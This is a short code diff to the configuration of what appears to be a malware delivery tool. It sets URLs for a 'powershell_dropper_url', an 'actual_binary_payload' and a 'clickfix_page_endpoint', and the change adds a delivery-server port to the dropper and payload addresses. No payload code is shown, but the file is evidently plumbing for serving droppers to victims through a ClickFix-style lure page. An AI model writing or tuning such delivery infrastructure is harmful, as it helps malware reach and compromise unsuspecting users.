@@ -28,8 +28,8 @@ deliveryServerPort = "10000"
 
 conf = {
     "URLS":{
-        "powershell_dropper_url":f"{proto(isDP)}{host}{dropperEndpoint}",
-        "actual_binary_payload":f"{proto(isDP)}{host}{binEndpoint}",
+        "powershell_dropper_url":f"{proto(isDP)}{host}:{deliveryServerPort}{dropperEndpoint}",
+        "actual_binary_payload":f"{proto(isDP)}{host}:{deliveryServerPort}{binEndpoint}",
         "clickfix_page_endpoint":f"{proto(isDP)}{host}{hookPageEndpoint}"
     },
     "PATHS":{
